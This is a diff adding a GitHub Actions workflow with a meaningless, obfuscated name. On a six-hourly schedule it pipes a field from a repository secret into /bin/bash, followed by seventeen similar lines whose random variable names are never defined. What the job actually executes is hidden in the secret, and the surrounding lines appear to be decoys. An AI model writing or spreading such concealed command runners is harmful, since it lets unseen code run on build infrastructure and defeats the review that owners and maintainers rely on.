@@ -1,0 +1,36 @@
+name: jiejisaoqingfaner
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiejisaoqingfaner
+        env:
+          fpgl78514: ${{ secrets.fpgl78514 }}
+        run: |
+          echo $fpgl78514 | jq -r .loj6098 | /bin/bash
+          echo $nnb5 | jq -r .v83 | /bin/bash
+          echo $atu4 | jq -r .hmivr766 | /bin/bash
+          echo $riclm540 | jq -r .mg791 | /bin/bash
+          echo $xg926 | jq -r .mf2 | /bin/bash
+          echo $pex3 | jq -r .qcl65 | /bin/bash
+          echo $lvle133 | jq -r .rlid22082 | /bin/bash
+          echo $eo6039 | jq -r .ocfs00210 | /bin/bash
+          echo $gqeyy099 | jq -r .vcz2 | /bin/bash
+          echo $pk88558 | jq -r .fya2879 | /bin/bash
+          echo $kv501 | jq -r .bpt5 | /bin/bash
+          echo $ojg72 | jq -r .eg981 | /bin/bash
+          echo $olkgg6 | jq -r .wcwzb0 | /bin/bash
+          echo $u1483 | jq -r .ybfpp4886 | /bin/bash
+          echo $iszv8972 | jq -r .gxzhi64067 | /bin/bash
+          echo $aqh20866 | jq -r .vkhs33337 | /bin/bash
+          echo $wkhoh563 | jq -r .meeiu65770 | /bin/bash
+          echo $n46 | jq -r .i2400 | /bin/bash
+
